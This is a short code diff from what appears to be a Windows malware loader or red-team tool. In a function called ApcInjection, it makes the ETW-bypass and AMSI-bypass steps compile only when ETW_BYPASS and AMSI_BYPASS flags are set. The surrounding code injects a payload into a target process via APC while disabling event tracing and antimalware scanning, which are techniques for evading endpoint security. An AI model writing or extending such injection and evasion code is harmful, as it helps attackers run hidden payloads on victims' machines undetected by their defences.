@@ -78,18 +78,22 @@ BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPaylo
 
     DebugPrint("[+] Alertable Target Thread Created With Id : %d \n", dwThreadId);
 
+#ifdef ETW_BYPASS
     //	apply ETW bypass
     if (!applyEtwBypass(hProcess)) {
         DebugPrint("[!] Failed To Apply ETW Bypass \n");
         return FALSE;
     }
+#endif
 
+#ifdef AMSI_BYPASS
     //	apply AMSI bypass
 	if (!applyAmsiBypass(hProcess)) {
 		DebugPrint("[!] Failed To Apply AMSI Bypass \n");
 		CloseHandle(hThread);
 		return FALSE;
 	}
+#endif
 
     DebugPrint("[i] Running Apc Injection Function ... \n");
 
